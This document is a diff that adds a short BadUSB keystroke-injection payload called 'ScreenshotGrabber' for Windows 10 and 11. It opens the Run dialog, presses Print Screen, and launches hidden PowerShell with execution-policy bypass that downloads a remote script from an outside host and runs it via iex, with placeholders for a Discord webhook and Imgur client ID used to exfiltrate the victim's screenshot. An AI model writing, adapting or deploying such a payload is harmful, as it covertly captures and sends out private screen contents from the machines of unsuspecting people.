@@ -1,0 +1,17 @@
+REM	Title: ScreenshotGrabber
+
+REM	Author: SeallDEV
+
+REM	Description: This payload will take a screenshot of the targets desktop, upload it to imgur and forward it to a Discord Webhook
+
+REM	Target: Windows 10, 11
+
+GUI r
+DELAY 500
+PRTSC
+STRING powershell -w h -ep bypass $dc='';$icid='';irm https://files.seall.dev/badusb/ScreenshotGrabber.ps1 | iex
+ENTER
+
+REM     Fill in the variable to set your exfil method.
+REM     $dc is the variable that holds your Discord webhook.  
+REM	$icid is the Imgur Client ID to upload with.
